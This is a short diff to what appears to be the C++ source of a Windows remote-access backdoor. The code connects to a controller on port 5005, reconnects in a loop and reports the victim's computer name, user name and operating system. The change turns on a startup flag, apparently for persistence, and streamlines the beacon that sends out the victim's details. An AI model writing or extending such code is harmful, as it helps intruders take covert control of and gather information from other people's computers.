@@ -11,7 +11,7 @@ const int PORT = 5005;
 
 char buffer[1024];
 const int TIMEOUT = 150000;
-bool startup = false;
+bool startup = true;
 
 SOCKET objSocket;
 string appdata = string(getenv("APPDATA"));
@@ -76,11 +76,7 @@ int main()
         closesocket(objSocket);
         WSACleanup(); main();
     }
-    else {
-        gethostname(buffer, sizeof(buffer));
-        sendall((string)buffer + "|" + getenv("USERNAME") + "|" + OperatingSystem);
-        memset(buffer, 0, sizeof(buffer));
-    }
+    else sendall((string)getenv("COMPUTERNAME") + "|" + getenv("USERNAME") + "|" + OperatingSystem);
 
     while (true)
     {
